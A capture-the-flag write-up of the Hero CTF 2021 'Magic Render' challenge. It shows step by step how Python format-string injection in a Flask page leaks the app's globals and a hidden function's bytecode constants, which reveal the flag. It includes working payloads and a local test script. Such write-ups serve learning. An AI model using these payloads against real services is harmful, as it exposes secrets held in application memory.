# Magic Render
This was a web challenge in the Hero CTF 2021.

https://www.heroctf.fr/challenges

![Magic Render Challenge](media/magic-render-chal.png)

Clicking the link gives us this page:
![Magic Render Page](media/magic-render-page.png)

You can enter a title and body and you'll get back an html page with your title and body inserted.

I tried various special characters until I saw that **{}** in the body causes this error.

`Something went wrong, sorry! It's only the alpha version !`

After some searching, I found this online: https://podalirius.net/articles/python-format-string-vulnerabilities/

Finding this page was key to solving this challenge.  No way would I have done so without it.


I tried an example from that page:

```{self.__init__.__globals__}```

and got (newlines added for readability):

```
{'__name__': '__main__', '__doc__': None, '__package__': None,
'__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f5107b17518>,
'__spec__': None, '__annotations__': {}, '__builtins__': , '__file__': 'app.py',
'__cached__': None, 'Flask': , 'render_template': , 'request': , 'FlaskView': ,
'route': , 'dis': , 'app': , 'port': 8050, 'secret_function': , 'App': }
```

Notice there is a secret_function!

At first I tried to access it like this:

```{self.__init__.__globals__.secret_function}```

but got back the error.  Eventually I learned that I needed to use brackets since `__globals__` is a dictionary.

```{self.__init__.__globals__[secret_function]}```

But that just gives back an empty page.

In hindsight, that makes sense since that object must not have a string representation or else it would've shown it to us when we dumped out `__globals__`.

If I try to call this function:

`{self.__init__.__globals__[secret_function]()}`

I get back an error.

At this point, I didn't know to do.

I copied some example code from the above page and hacked on it a bit so I could play around with this locally.

```
import sys

def secret_function():
    flag = 'wow'
    return flag

class TEST():
    def __init__(self):
        self.testValue = 'test'

    def renderHTML(self, templateHTML, text):
        return (templateHTML.format(self=self, text=text))

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage : python3 "+sys.argv[0]+" TEMPLATE CONTENT")
    else :
        a = TEST()
        print(a.renderHTML(sys.argv[1], 'foo'))

```

I could then call this locally like:

`python3 crack.py '{self.__init__.__globals__}'`

and got this output:
```
{'__name__': '__main__', '__doc__': None, '__package__': None,
'__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x10ebb0040>,
'__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>,
'__file__': 'crack.py', '__cached__': None, 'sys': <module 'sys' (built-in)>,
'secret_function': <function secret_function at 0x10ede2790>, 'TEST': <class '__main__.TEST'>,
'a': <__main__.TEST object at 0x10edf6fd0>}
```

That looks similar enough to the challenge that I thought I was on the right track.

Wanting to know what was hiding inside the function object, I hacked the renderHTML() method to be:

```
    def renderHTML(self, templateHTML, text):
        return dir(self.__init__.__globals__['secret_function'])
```

The dir() method will dump out all of an object's properties.

It printed this:

```
['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__',
'__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__',
'__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__',
'__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__',
'__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```

Not knowing what to look for, I tried several of these until I stumbled upon `__code__`:

```
    def renderHTML(self, templateHTML, text):
        return dir(self.__init__.__globals__['secret_function'].__code__)
```

and got:

```
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__',
'__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__',
'__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount',
'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars',
'co_kwonlyargcount', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_posonlyargcount', 'co_stacksize',
'co_varnames', 'replace']
```

**co_varnames** looked interesting so I tried:

```
return self.__init__.__globals__['secret_function'].__code__.co_varnames
```

and got:

`('flag',)`

Then I tried  **co_consts**:
```
return self.__init__.__globals__['secret_function'].__code__.co_consts
```

and got:

`(None, 'wow')`

Armed with this, I was ready to return to the challenge.

When I submit this for the body:

`{self.__init__.__globals__[secret_function].__code__.co_varnames}`

it returned:

`('flag',)`

Finally, I submitted:

`{self.__init__.__globals__[secret_function].__code__.co_consts}`

and got:

`(None, 'Hero{l34k_my_byt3c0d3zzzzzz}')`

Again, I got lucky that I found this particular page and that I happened find my way through the maze of properties to find the one containing the flag.

I definitely learned a lot about all of the properties I never knew were hiding inside Python function objects.


